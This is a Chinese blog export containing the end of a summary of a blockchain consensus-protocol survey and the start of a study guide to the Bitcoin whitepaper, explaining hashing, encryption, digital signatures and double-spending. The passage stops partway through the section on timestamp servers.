<p>GHOST 规则满足持久性和活性要求,但活性弱于最长链规则.GHOST规则[12]作为最长链规则的替代,只要诚实节点掌握大部分算力,在网络交易吞吐量高的情况下,依然可以保证安全性.文献[97]理论证明了 GHOST 协议满足持久性和活性,然而文献[97]认为:<strong>在网络交易吞吐量高的情况下,GHOST 规则相对最长链规则并没有性能优势</strong> .除此以外,<strong>文献[97]提出了一种针对区块链活性的攻击方法,通过干扰交易和区块的传播,拖延交易的确认时间,从而破坏活性</strong> .在这种攻击方式下,GHOST 的活性弱于最长链规则.由于 Conflux 利用 GHOST 协议选择主链,因此安全性质和 GHOST 相同[25].</p>
</blockquote>
<ul>
<li>包容性协议</li>
</ul>
<blockquote>
<p>包容性协议满足持久性和活性.文献[26]未对包容性协议进行理论证明,但通过实验方式显示,协议可满足持久性和活性.</p>
</blockquote>
<ul>
<li>SPECTRE协议</li>
</ul>
<blockquote>
<p>SPECTRE 协议可保证区块链系统的持久性和弱活性(SPECTRE 协议中未对持久性(persistence)进行证明,但其中的一致性、安全性与持久性同一定义,因此我们将其看做对持久性的证明) [51].SPECTRE 协议在交易内容互不冲突时,能保证交易在有限时间内被打包到区块中,即满足活性要求.然而,<strong>当攻击者同时发起两笔冲突交易时,合法交易只能满足弱活性,即交易最终会被打包到区块中,但时间有明显延迟.</strong></p>
</blockquote>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image_8.png" alt="1"></p>
<p>激励相容(incentive compatibility)问题：</p>
<blockquote>
<p>激励相容问题指节点的个人目标与系统目标不一致,其中最典型的是<strong>自私挖矿问题</strong> .在工作量证明机制的基础上,为鼓励节点加入网络维护安全,系统通常以数字货币形式给出块节点一定报酬.然而大量研究工作[65,66,98,99]发现,<strong>当节点掌握算力达到一定程度时,理性节点选择不遵守协议将获得更高的收益.这些节点被称为自私挖矿节点,他们将生成的新区块隐藏起来,并选择在将来的适当时机公开,从而获得更高收益.</strong> 这些隐藏区块可能会颠覆网络的公开区块,引发安全问题.</p>
</blockquote>
<blockquote>
<p>在自私挖矿影响下,最长链规则的安全边界从 50%降低到 33%,即只能抵御算力不超过 33%的恶意节点.随后,一系列研究工作[66,98]在最长链规则上拓展不同的自私挖矿策略,进一步降低系统安全边界.与最长链规则类似,GHOST 规则和包容性协议也受到自私挖矿的影响[26,66].SPECTRE 协议没有说明是否存在自私挖矿问题.此外,由于 Conflux 协议基于 GHOST 规则选择主链,也有同样的自私挖矿问题.</p>
</blockquote>
<h3 id="3-2-确定性共识"><a href="#3-2-确定性共识" class="headerlink" title="3.2 确定性共识"></a>3.2 确定性共识</h3><p>概率性共识存在的问题：</p>
<blockquote>
<p>概率性共识在交易延迟与安全性存在天然的权衡问题[100],限制了区块链技术的应用场景.<strong>概率性共识的权衡问题源于区块数据的一致性概率随着时间推移逐渐提高,为保证交易安全性,用户不得不等待多个区块确认,带来明显的交易延时.</strong> 延时问题限制了基于概率性共识的区块链系统的商业应用.</p>
</blockquote>
<p>引出确实性共识：</p>
<blockquote>
<p>在确定性共识中,区块一旦写入节点本地区块链,就不存在随后被改变的可能性.确定性共识有两个明显优势[15]:首先,用户不用等待较长时间确保交易安全性;其次,由于同一高度仅有一个合法区块,节点不用在分叉区块上浪费计算资源.</p>
</blockquote>
<p>拜占庭将军问题：</p>
<blockquote>
<p>拜占庭容错协议用于解决分布式系统中的拜占庭将军问题,在存在恶意节点的情况下达成一致性.<strong>拜占庭将军问题由 Leslie Lamport 在 1982 年[31]提出</strong> ,诚实将军在叛徒将军的干扰下对进攻命令达成一致.</p>
</blockquote>
<p>经典拜占庭共识存在的问题：</p>
<blockquote>
<p>经典的拜占庭容错协议通常面向中心化的分布式集群达成确定一致性,如 <strong>PBFT[27]、Byzantine Paoxs[101]</strong> 等,但无法直接应用在区块链系统中.<strong>在这些协议中,共识节点数量固定或者变化缓慢[27],节点之间需要多轮广播通信[102],通信复杂度较高.</strong> 然而区块链系统中的节点数量不断动态变化,区块链系统(特别是非许可链)的网络规模也不支持节点间的多轮广播通信,因此,区块链拜占庭容许协议需要适应系统特点进行改进.</p>
</blockquote>
<h4 id="3-2-1-非许可链拜占庭容错协议"><a href="#3-2-1-非许可链拜占庭容错协议" class="headerlink" title="3.2.1 非许可链拜占庭容错协议"></a>3.2.1 非许可链拜占庭容错协议</h4><p>混合协议（结合拜占庭容错协议和区块链的出块节点选举机制）：</p>
<blockquote>
<p>在出块节点选举阶段,混合协议采用区块链的选举机制,抵御开放网络中的女巫攻击等问题;</p>
</blockquote>
<blockquote>
<p>在主链共识阶段,混合协议通常让多个出块节点构成组委会,运行拜占庭容错协议,对新区块达成一致.组委会成员通常随着时间变化[103].</p>
</blockquote>
<p>相关协议：</p>
<ul>
<li><p>Algorand，权益证明和拜占庭容错协议结合的混合协议：</p>
<blockquote>
<p>在出块节点选举阶段,Algorand 利用<strong>基于随机函数的权益证明</strong> 选出一组出块节点,<strong>每个节点发起区块提案(block proposal)并广播,各提案附有随机优先级,每个节点只保留优先级最高的区块</strong> ;随后,节点再运行一轮<em><em>拜占庭一致性协议(BA</em>)</em>* ,将自己接收到的最高优先级区块作为输入,对区块达成共识.</p>
</blockquote>
<p>  Algorand中的拜占庭一致性协议分为两个阶段：</p>
<ul>
<li><p>规约(reduction)，保证各节点持有相同的最高优先级区块：</p>
<blockquote>
<p>在规约阶段,所有节点广播自己本地最高优先级的区块哈希,接收到其他节点的区块哈希后,节点统计每个区块的票数,认定票数最高的区块为最高优先级区块;没有票数最高区块时,将空区块作为最高优先级区块.归约阶段达成一致的区块将作为二进制一致性阶段的输入.</p>
</blockquote>
</li>
<li><p>二进制一致性(binary agreement)：</p>
<blockquote>
<p>在二进制一致性阶段,出块节点选举环节发起区块提案的节点形成组委会,<strong>对规约阶段的区块投票.区块收到一定数量票数后,就被确认为最终区块.</strong> 所有节点将该区块更新到本地区块链中,达成确认性共识.由于网络原因,二进制一致性阶段的投票可能会重复多次.</p>
</blockquote>
</li>
</ul>
</li>
<li><p>Byzcoin，工作量证明和实用拜占庭容错协议结合的混合协议：</p>
<blockquote>
<p>在出块节点选举阶段,节点利用工作量证明生成新区块并广播.<strong>一个时间间隔(1 天或 1 周,可调整)内的出块节点构成组委会.组委会成员的票数为在该时间间隔内的出块数量</strong> ,成员利用<strong>实用拜占庭容错协议(PBFT)</strong> 对新区块投票达成共识.出块节点广播新区块,组委会成员验证区块无误后返回签名作为投票,出块节点搜集至少 2&#x2F;3 票数后,广播组委会成员签名,证明新区块已经被组委会接收并验证.组委会成员接收到广播信息后,再次返回签名,表示同意将该区块写入区块链中,出块节点搜集至少 2&#x2F;3 票数后,再次广播区块,并写入区块链中.</p>
</blockquote>
<p>  <img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image_9.png" alt="1"></p>
</li>
<li><p>Stellar，采用联邦拜占庭协议(federated Byzantine agreement,简称 FBA)达成共识：</p>
<blockquote>
<p>Stellar 是一个开放的实时跨境支付系统[104],为了使拜占庭协议支持非许可链中开放成员的需求,引入仲裁系统分片(quorum slice)达成共识.在拜占庭协议中,仲裁系统指可达成共识的一组节点.仲裁系统分片是仲裁系统子集.Stellar 的仲裁系统基于某种标准划分,例如声誉或权益,节点可同时加入多个仲裁系统分片.仲裁系统分片保持交集,保证共识达成.</p>
</blockquote>
<p>  主要分为投票、接收和确认 3 个阶段：</p>
<blockquote>
<p>在投票阶段,节点对接收到的交易进行投票并广播投票信息.</p>
</blockquote>
<blockquote>
<p>在接收阶段,若节点 v-blocking 集合中的所有节点都投票给该交易,则接收该交易.v-blocking 是和该节点所在的全部仲裁分片有交集的节点集合.</p>
</blockquote>
<blockquote>
<p>在确认阶段,节点间通过消息交互对接收阶段的交易达成最终共识.仲裁分片互相影响,最终保证所有诚实节点对交易达成确定性共识.</p>
</blockquote>
</li>
</ul>
<h4 id="3-2-2-许可链拜占庭容错协议"><a href="#3-2-2-许可链拜占庭容错协议" class="headerlink" title="3.2.2 许可链拜占庭容错协议"></a>3.2.2 许可链拜占庭容错协议</h4><ul>
<li>HoneyBadger</li>
</ul>
<blockquote>
<p>HoneyBadger[16]首次将实践拜占庭容错协议应用到纯异步许可链中.HoneyBadger 系统中,<strong>共识节点身份已知且数量固定,节点两两建立经过认证的可信通道.</strong> 为了消除出块节点广播区块这一环节的带宽瓶颈,HoneyBadger 没有采用出块节点选举机制,取而代之的是:各节点在每轮出块开始时,从本地交易缓冲池中选择部分交易进行广播.为了避免拜占庭节点故意忽略某些交易从而影响系统活性,节点不广播交易内容本身而是经门限加密后的交易密文.所有节点收到密文集合后,HoneyBadger 通过拜占庭协议对一组位向量(bit vector)达成共识,假设位向量第 N 位为真,则将密文集合对应的第 N 位密文还原,并将其中包含的交易写入区块.</p>
</blockquote>
<ul>
<li>Tendermint</li>
</ul>
<blockquote>
<p>联盟链系统 Tendermint[81]采用基于轮询机制的实用拜占庭容错协议对新区块达成共识.在出块节点选举环节,Tendermint 采用确定性轮询机制决定出块节点.由于未采用类似工作量证明的身份定价机制,为防止拜占庭节点发动女巫攻击,系统规定节点必须在账户存入保证金才能参与拜占庭容错协议的投票过程,保证金数额与票数成正比.在网络弱同步且诚实节点掌握至少 2&#x2F;3 票数的情况下,Tendermint 满足安全性和活性.</p>
</blockquote>
<p>一些许可链采用CFT而非BFT（CFT不就是分布式数据库了）：</p>
<blockquote>
<p>除使用拜占庭容错协议外,一些企业级区块链系统采用 CFT 协议而非 BFT 协议达成确定性共识.2016 年初,Linux 基金会发起了 Hyperledger 项目,旨在建立企业级区块链框架[106],目前已有超过 270 个机构加入[107].Hyperledger Fabric(以下简称 Fabric)是 Hyperledger 项目中备受关注的一个子项目,打造面向许可链的分布式数据平台.Fabric v0.5 采用了 PBFT 协议在共识节点之间对交易内容实现共识[106],目前<strong>最新的 Fabric v1.4 用 Raft和 Apache Kafka 两种 CFT 协议实现共识</strong> [108].</p>
</blockquote>
<h4 id="3-2-3-安全分析"><a href="#3-2-3-安全分析" class="headerlink" title="3.2.3 安全分析"></a>3.2.3 安全分析</h4><p>由于不存在分叉情况，确定性共识不存在概率性共识中的自私挖矿问题。</p>
<ul>
<li>Algorand</li>
</ul>
<blockquote>
<p>在强同步网络及诚实节点掌握至少 2&#x2F;3 权益的情况下,Algorand 满足安全性和活性.Algorand 拜占庭一致性协议(BA*)基于强同步网络,大多数(如 95%)诚实节点发送的消息在已知时间间隔内可发送给其他大多数诚实节点.<strong>BA*在弱同步网络情况下不能达成一致性,需要等待网络变为强同步.</strong> Algorand 采用权益证明的出块节点选举机制,要求诚实节点掌握系统中至少 2&#x2F;3 的权益.<strong>最好情况下,即每个节点收到的最高优先级区块一致时,Algorand 需要节点间的四轮交互达成共识;最坏情况下则需要 13 轮.</strong></p>
</blockquote>
<ul>
<li>Byzcoin</li>
</ul>
<blockquote>
<p>在弱同步网络及节点总数至少 3f+2 的情况下,Byzcoin 满足安全性和活性.Byzcoin 是实用拜占庭容错协议和工作量证明的混合协议,网络环境要求和实用拜占庭容错协议一致,即消息延迟有上限但上限不可知的弱同步环境.当网络存在 f 个恶意节点时,Byzcoin 需要至少 3f+2 节点数才能达成共识.</p>
</blockquote>
<ul>
<li>Stellar</li>
</ul>
<blockquote>
<p>在同步网络及节点选择足够多的仲裁分片的情况下,Stellar 满足安全性,但恶意节点故意过滤交易时, Stellar 活性受到影响.Stellar 分为投票、接收和确认这 3 个阶段,投票和接收阶段要求同步网络,确认阶段可以是异步网络,总体上,Stellar 需运行在同步网络中.在节点选择足够多的仲裁分片,且仲裁分片中声誉或权益高的节点是诚实节点时,文献[28]证明:Stellar 满足安全性,但恶意节点在 Stellar 的交易投票阶段故意过滤交易,会影响交易活性.</p>
</blockquote>
<ul>
<li>HoneyBadger</li>
</ul>
<blockquote>
<p>由于采用拜占庭容错协议,为抵御 f 个恶意节点,HoneyBadger 需要至少 3f+1 个节点保证安全性.HoneyBadger 可用于广域网中的联盟链系统,系统可扩展至上百节点数.</p>
</blockquote>
<h4 id="3-2-4-总结"><a href="#3-2-4-总结" class="headerlink" title="3.2.4 总结"></a>3.2.4 总结</h4><p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image_10.png" alt="1"></p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B9%8B%E5%85%B1%E8%AF%86%E2%80%94%E2%80%94%E8%A7%A3%E8%AF%BB%E3%80%8A%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%B1%E8%AF%86%E5%8D%8F%E8%AE%AE%E7%BB%BC%E8%BF%B0%E3%80%8B/image_11.png" alt="1"></p>
<h2 id="4-总结与展望"><a href="#4-总结与展望" class="headerlink" title="4 总结与展望"></a>4 总结与展望</h2><ul>
<li><p>对于出块节点选举机制：</p>
<blockquote>
<p>工作量证明通过物理资源的投入抵御恶意节点,存在算力中心化、资源浪费、选举性能低等若干问题.为了解决这些问题,一些研究工作用内存密集型函数替代计算密集型函数、利用算力提供有用服务、调整工作量证明难题参数等.部分方案改变了系统性质,从而引出了新的研究问题,包括改变区块大小、出块间隔、难度调整算法等,<strong>研究人员可针对已有攻击方式在改进系统中的新型攻击手段、安全边界展开研究.</strong></p>
</blockquote>
<blockquote>
<p>权益证明被用于解决工作量证明的资源浪费问题,由早期的竞争性难题机制逐渐演变为基于随机函数的非竞争性机制.<strong>非竞争性机制由于安全和高效,是目前权益证明的重点研究方向.权益证明也存在粉碎攻击、无权益攻击和长程攻击等问题,但目前尚没有对权益证明及其安全问题的综述研究.</strong></p>
</blockquote>
</li>
<li><p>对于主链共识：</p>
<blockquote>
<p>概率性共识从早期基于区块树的选取规则逐渐演变为基于有向无环图的选取规则,且共识粒度从区块细化为交易,部分有向无环图协议对交易全局顺序达成概率性共识.当前,大部分概率性共识通过理论证明满足安全性和活性.<strong>然而,概率性共识之间缺乏对比工作,目前仅有最长链和GHOST 规则的安全性对比分析.在调研过程中我们发现,最长链规则仍是区块链系统的主导规则,GHOST 规则在研究工作中备受关注但目前缺乏实际应用.此外,几乎所有基于工作量证明的概率性共识都存在自私挖矿问题,但尚未有研究工作对除最长链规则以外的其他概率性共识度量自私挖矿攻击的影响.</strong></p>
</blockquote>
<blockquote>
<p>为满足非许可链开放成员及网络规模要求,大多数确定性共识将出块节点选举机制与拜占庭容错协议相结合,实现区块链系统的确定一致性.这些协议通常运行于异步网络中,并要求恶意节点不超过节点总数的 1&#x2F;3.<strong>据我们所知,目前尚没有可运行于大规模纯异步网络中的确定性共识协议.HoneyBadger 作为纯异步共识协议,只适用于节点身份和数量都已知的非许可链系统.</strong></p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>欲穷千里目，更上一层楼</category>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链入门——比特币</title>
    <url>/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81.html</url>
    <content><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>区块链技术基础课程的一个作业，要求精读区块链经典论文《Bitcoin: A Peer-to-Peer Electronic Cash System》。我也正好借机拜读<strong>中本聪</strong>的这篇神作，以此入门区块链。</p>
<span id="more"></span>

<h2 id="1-论文解读"><a href="#1-论文解读" class="headerlink" title="1. 论文解读"></a>1. 论文解读</h2><h3 id="1-0-摘要"><a href="#1-0-摘要" class="headerlink" title="1.0. 摘要"></a>1.0. 摘要</h3><blockquote>
<p>A purely peer-to-peer version of electronic cash would allow online payments to be sent directly from one party to another without going through a financial institution. Digital signatures provide part of the solution, but the main benefits are lost if a trusted third party is still required to prevent double-spending. We propose a solution to the double-spending problem using a peer-to-peer network. The network timestamps transactions by hashing them into an ongoing chain of hash-based proof-of-work, forming a record that cannot be changed without redoing the proof-of-work. The longest chain not only serves as proof of the sequence of events witnessed, but proof that it came from the largest pool of CPU power. As long as a majority of CPU power is controlled by nodes that are not cooperating to attack the network, they’ll generate the longest chain and outpace attackers. The network itself requires minimal structure. Messages are broadcast on a best effort basis, and nodes can leave and rejoin the network at will, accepting the longest proof-of-work chain as proof of what happened while they were gone.</p>
</blockquote>
<p>摘要开头指出，比特币是一种<strong>完全的点对点(P2P)电子货币，可直接从一方交易到另一方，不需要任何中间金融机构</strong> ，此处说明了比特币的第一大特性：<strong>去中心化</strong> 。</p>
<p>去中心化的电子货币交易，从字面意思上很好理解，就是把中间商去掉。但实际上，却带来了非常多的问题：</p>
<ol>
<li><p>谁来发币？</p>
</li>
<li><p>如何证明你的币是真的？或者，如何证明币的来源正确？</p>
</li>
<li><p>如何证明交易有效？这个问题又包含两个子问题：</p>
</li>
</ol>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;3.1. A要向B支付10个币，如何保证10个币是由A支付的？又如何保证B收到了这10个币？</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;3.2. 如何保证A支付给 B 10个币的同时，没有把这10个币支付给另一个人C？</p>
<p>去中心化电子货币的部分问题3.1可用<strong>数字签名</strong> 解决，但3.2 <strong>双重支付(double-spending)</strong>  才是主要问题。而论文提出了一种方法，用于解决双重支付的问题，具体解决方法将在后文讲解。</p>
<p>同时，在比特币网络中，只要多数CPU算力掌握在好节点的手上，那系统就是安全的。</p>
<p>摘要最后指出，比特币网络只需要简单的结构，节点可以随时离开或加入网络。</p>
<h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1. 简介"></a>1.1. 简介</h3><p>简介中指出了当下互联网交易的一些缺点：</p>
<ul>
<li><p>完全依赖于可信任的第三方机构</p>
</li>
<li><p>交易可以撤销</p>
</li>
<li><p>杜绝了小额交易</p>
</li>
<li><p>由于交易可撤销，商家会要求客户提供本不必要的信息</p>
</li>
</ul>
<p>而比特币系统将具备以下优点：</p>
<ul>
<li><p>基于密码学原理，不需要可信任的第三方</p>
</li>
<li><p>交易不可撤销，将保护商家不被欺诈</p>
</li>
<li><p>保护客户的合约机制也比较容易实现</p>
</li>
</ul>
<h3 id="1-2-交易"><a href="#1-2-交易" class="headerlink" title="1.2. 交易"></a>1.2. 交易</h3><blockquote>
<p>We define an electronic coin as a chain of digital signatures. Each owner transfers the coin to the next by digitally signing a hash of the previous transaction and the public key of the next owner and adding these to the end of the coin. A payee can verify the signatures to verify the chain of ownership.</p>
</blockquote>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81/1.png" alt="1"></p>
<p>在这一节中，中本聪定义比特币是一串数字签名：每一个拥有者将货币支付给下一个拥有者时，需要将<strong>下一个拥有者的公钥</strong> 和<strong>上一笔交易</strong> 取<strong>哈希</strong> ，并对哈希值进行<strong>数字签名</strong> ，最后把数字签名添加到交易末尾。</p>
<p>为了理解这段话，我们需要先了解<strong>哈希</strong> 和<strong>非对称加密</strong> 。</p>
<h4 id="密码学基础"><a href="#密码学基础" class="headerlink" title="密码学基础"></a>密码学基础</h4><h5 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h5><p><strong>哈希</strong> ，又称散列，英文名<code>Hash</code>。是将<strong>任意长度</strong> 的输入$x$通过哈希函数（又称哈希算法）$H$，得到<strong>固定长度</strong> 的哈希值$H(x)$的过程。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81/image.png" alt="1"></p>
<p>优秀的哈希函数具有<strong>不可逆性</strong> ，即哈希函数不存在反函数。那么，指定$H(x)$无法高效地推出输入$x$，唯一的方法是遍历所有输入。</p>
<p>由于哈希函数定义域（输入x的范围）是无限的，而值域（输出y的范围）是有限的，理论上会出现<strong>哈希碰撞</strong> ：对于$x \neq y$，存在$H(x) &#x3D; H(y)$。但是，<strong>优秀的哈希函数，出现哈希碰撞的概率几乎为0</strong> ，即：若$x \neq y $，则$H(x) \neq H(y)$。比如，<strong>比特币中用到的哈希函数SHA-256</strong> ，输出的哈希值有256位(bit)，相当于有 $2^{256} \approx 10^{77}<br>$ 种不同的结果。对于这样的哈希函数，给定一个输入$x$，不存在高效的方法找到另一个$y$使得$H(x) &#x3D; H(y)$，唯一的方法也是遍历所有输入，但这在现实中基本不可能。</p>
<p>根据上述特性，哈希就有两大功能：</p>
<ol>
<li><p>保证数据的完整性，即<strong>防止数据被篡改</strong> 。比如，你有一份数据文件想通过互联网发给另一个人，怎么保证在传输过程中数据没有被篡改呢？那就可以事先告诉对方哈希值，对方收到文件后计算哈希值并进行对比，如果不相等则说明被篡改。</p>
</li>
<li><p><strong>数据摘要</strong> 。对于任意长度的输入都能得到固定长度的输出，且对于任一个输入，输出是都是唯一的。当你需要一个固定的输入，又不要求跟原文一定相同，只要求存在唯一关联时，就可以使用哈希，比如下文提到的数字签名。</p>
</li>
</ol>
<p>至于哈希函数究竟是如何实现的，此处不做介绍（咱也不会）。</p>
<h5 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h5><p>了解非对称加密之前，需要先了解对称加密。</p>
<p>众所周知，互联网上的数据传输是不安全的。任意两方在传输数据时，都有可能被恶意的第三方监听。因此，对于机密数据，在传输过程中必须进行加密，这样第三方即便获取也无法知道其中的内容。但是，接收方也要知道如何进行解密，不然他也看不懂。于是，出现了对称加密。</p>
<p>对称加密是一类加密算法，在加密与解密时必须使用同一个<strong>密钥</strong>（密钥可自定义）。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81/image_1.png" alt="1"></p>
<p>在古代，寄送机密信件时，为了防止信件在途中被截获导致泄密，存在一种方法：将关键文字分散在一篇诗或文章中，事先告诉对方第几行第几个文字拼凑在一起，才是真正的内容，这样即使被截获也能防止机密泄露。这其实就是一种对称加密，将关键文字分散的过程和提取关键文字的过程，就是加密算法中加密解密的过程，而第几行第几个字就是密钥。</p>
<p>在互联网通信中，发送方可事先告知接收方一个密钥$K$，发送方用该密钥对数据$m$进行加密$c&#x3D;K(m)$，接收方再用该密钥进行解密$m&#x3D;K(c)$。只要密钥不泄露，第三方将无法得知传输中的数据，除非能够破解。当下常见的对称加密算法有<strong>DES</strong> 、<strong>AES</strong> 等，它们高效且安全，在不知道密钥的情况下几乎无法破解密文。</p>
<p>但是，对称加密的一个大问题是：<strong>如何将密钥告知对方？</strong> 若通过互联网发送密钥，则很可能导致密钥泄露，密钥如果泄露，加密的密文将被第三方轻松解密。若能通过线下当面告知，则是最安全的，但这在现实中很不方便。因此，出现了非对称加密。</p>
<h5 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h5><p>非对称加密也是一类加密算法，不同于对称加密，非对称加密有两个密钥：<strong>公钥(对外公开)</strong> 和<strong>私钥(对外保密)</strong> ，<strong>公钥加密的内容需要私钥才能解密</strong> ，<strong>私钥加密的内容需要公钥才能解密，且公钥无法推出私钥</strong> 。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81/image_2.png" alt="1"></p>
<p>互联网上通信时，每个人都可以生成一对唯一的、互不相同的公私钥。假设发送方A的公私钥分别为$K^+_A$和$K_A^-$，接收方B的公私钥分别为$K_B^+$和$K_B^-$。<strong>A给B发送数据前，需要先询问B的公钥</strong> ，B将公钥$K_B^+$告知A。<strong>发送数据时，A用B的公钥</strong> $K^+_B$<strong>对数据加密</strong> $c&#x3D;K^+_B(m)$。B收到数据后，用自己的私钥$K_B^-$对数据解密$m&#x3D;K^-_B(c)$。<strong>反之，若B要给A发信息，同样需要询问A的公钥，并用A的公钥对数据加密。</strong></p>
<blockquote>
<p>你把你家的邮箱放在楼下, 所有的人都可以往里扔邮件, 而只有你能打开邮箱查看邮件。</p>
</blockquote>
<p>或许你会问，<strong>公钥在传输过程不一样会被第三方截取吗？是，但没用。</strong> 比如，A给B传输数据前，会询问B的公钥，B将他的公钥发送给A的过程中被恶意第三方C截获了。但是，A发给B的数据C依旧不能解开，因为用B公钥加密的数据必须用B私钥解密，而B的私钥并没有泄露给C（假设只有传输过程才会泄露，不考虑电脑被入侵等情况）。而这就是非对称加密的独到之处。</p>
<p>仔细想想，这个过程真的没有漏洞吗？答案是否定的。同样是上述例子，B将他的公钥$K^+_B$发送给A的过程中被C截获了。此时，C可以将他自己的公钥$K^+_C$发送给A。由于互联网中验证身份困难，A会以为收到的是B的公钥，其实是C的公钥。当A发送数据时，会用$K^+_C$加密，这样加密数据就能被C解密。C篡改数据后，再用$K^+_B$加密发给B。A以为接收方是B，B以为发送方是A，谁都不知道数据已经被篡改了。对于这个问题，可以使用CA证书等方法解决，具体内容不在此阐述。</p>
<p>除了用来加密，非对称加密算法还可以用来<strong>数字签名</strong> ，对应非对称加密的另一大功能：私钥加密的内容需要公钥才能解密。某个用户A用自己的私钥$K_A^-$对发布的内容加密，任何人都可以用A的公钥$K_A^+$解密。由于能用$K_A^+$解密，则可以证明数据是由$K_A^-$加密的，而只有A拥有$K_A^-$，进而可以<strong>证明这个文件或内容是由A发布&#x2F;签名的</strong> 。</p>
<p>如今最著名、使用最广泛的非对称加密算法是<strong>RSA算法</strong> （由发明者Rivest、Shmir和Adleman姓氏首字母缩写而来）。</p>
<h4 id="理解区块链中的交易"><a href="#理解区块链中的交易" class="headerlink" title="理解区块链中的交易"></a>理解区块链中的交易</h4><p>在比特币系统中，由于没有中心，每个参与者（节点）都需要记录系统中所有成功的交易。如此，每个参与者在交易时，才能证明对方的钱是有真实来源的。</p>
<p>对于新发生的一笔交易，比特币系统规定：在交易末尾，需要对<strong>收款方公钥和上一笔交易的哈希</strong> 进行<strong>数字签名</strong> 。</p>
<p><img src="/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81/image_3.png" alt="1"></p>
<p>在上图中，有三个重要的点：付款方A的数字签名、收款方B的公钥、上一笔交易。它们的作用分别是：</p>
<ul>
<li><p><strong>付款方A的数字签名很好理解，是为了证明这笔交易是由A发起的</strong> ，即付款方是A。当然，为了所有人都能验证这个数字签名，交易内容中还会给出付款方A的公钥。</p>
</li>
<li><p>而<strong>收款方B的公钥是为了证明这笔钱是给B的</strong> ，即收款方是B。</p>
</li>
<li><p><strong>那为什么需要上一笔交易呢？原因很简单，用来证明A的币的来源有效</strong> ，比如：上一笔交易是E支付给A10个币。如果上一笔交易的收款方与当前交易的付款方不相同（对比公钥），或上一笔收款金额不够当前交易的支付金额，则交易无效。这样也能<strong>防止不经别人同意，伪造交易从别人钱包中“偷钱”</strong> 。</p>
</li>
</ul>
<p>新交易创建后，需要告诉系统中所有参与者，只有大家都验证交易有效，交易才算成功。</p>
<p>最后一点，为什么要使用哈希呢？这是因为数字签名大多都需要先哈希，这样能保证数字签名的输入是固定长度的，进而保证输出是固定长度。同时，哈希还能防止数据被篡改。</p>
<h4 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h4><p>交易规则能保证交易有效，但依旧存在一个问题：<strong>双重支付</strong> ——A只有10个币，他同时给B和C各支付10个币，单独验证这两笔交易都没有问题，但这显然是不正确的。</p>
<p>当存在可信的第三方机构（比如银行）时，银行会记录每笔交易的时间，并保存所有的交易记录。A支付的两笔交易总有先后，那么先产生的交易成功，后产生的交易肯定会失败，因为银行会判定A的10个币已经花完。但在去中心化的系统中，没有银行，那应该怎么办呢？更多精彩，请见下文。</p>
<h3 id="1-3-时间戳服务器"><a href="#1-3-时间戳服务器" class="headerlink" title="1.3. 时间戳服务器"></a>1.3. 时间戳服务器</h3><p>为了解决双重支付的问题，有两个关键：首先，每个参与者都需要知晓系统中所有的交易，即所有交易必须公开；其次，每个参与者需要对一个有先后顺序、完整的交易序列达成共识。如此，我们就能验证：在新交易之前，这笔钱有没有被花过。</p>
<p>公开交易简单，但如何确实先后顺序呢？解决办法是给每个交易打上时间戳，即记录交易时间。但是在比特币这种P2P网络中，没有中心服务器统一时间，时间由每个节点自定义，不仅可能存在误差，恶意节点还可能乱改时间。</p>
<p>比特币中的解决方案是：</p>
<ol>
<li><p>系统中<strong>最新的多笔交易</strong> 会被打包成一个区块，区块中还会包含<strong>上一个区块的哈希值</strong> 和<strong>区块创建时间戳</strong> （这里的时间戳是unix时间戳只是时间的一种表现形式）。</p>
</li>
<li><p>新区块创建后，需要对新区块计算哈希值，<strong>新区块及其哈希值会被公布在系统中。</strong></p>
</li>
